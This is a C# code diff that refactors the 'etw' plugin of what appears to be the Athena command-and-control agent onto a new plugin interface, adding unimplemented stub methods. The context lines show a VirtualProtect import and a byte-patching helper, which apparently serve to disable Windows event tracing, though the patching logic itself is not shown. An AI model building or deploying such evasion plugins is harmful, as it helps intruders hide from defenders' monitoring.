@@ -1,4 +1,5 @@
 ﻿using Athena.Commands.Models;
+using Athena.Models.Comms.Tasks;
 using System;
 using System.Collections.Generic;
 using System.Runtime.InteropServices;
@@ -17,10 +18,23 @@ namespace Plugins
         [DllImport("kernel32")]
         public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
     }
-    public class Etw : AthenaPlugin
+    public class Etw : IPlugin
     {
-        public override string Name => "etw";
-        public override void Execute(Dictionary<string, string> args)
+        public string Name => "etw";
+
+        public bool Interactive => false;
+
+        public void Interact(InteractiveMessage message)
+        {
+            throw new NotImplementedException();
+        }
+
+        public bool IsRunning()
+        {
+            throw new NotImplementedException();
+        }
+
+        public void Start(Dictionary<string, string> args)
         {
             try
             {
@@ -46,6 +60,12 @@ namespace Plugins
 
             }
         }
+
+        public void Stop(string task_id)
+        {
+            throw new NotImplementedException();
+        }
+
         private bool SpearAndShield(byte[] bSpear)
         {
             try
